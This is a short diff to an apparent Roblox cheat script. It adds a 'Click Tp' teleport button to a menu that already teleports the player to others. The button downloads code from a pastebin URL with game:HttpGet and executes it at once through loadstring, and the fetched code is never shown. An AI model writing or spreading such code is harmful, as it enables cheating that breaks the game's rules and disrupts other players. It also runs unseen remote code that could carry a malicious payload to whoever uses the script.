@@ -85,6 +85,9 @@ TeleportSection:NewTextBox("Teleport To Player", "Input Players name to teleport
 	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[txt].Character.HumanoidRootPart.CFrame
 end)
 
+TeleportSection:NewButton("Click Tp", "Press CTRL + M1 to teleport", function()
+    loadstring(game:HttpGet('https://pastebin.com/raw/qyww70GR'))()
+end)
 
 -- OTHER
 
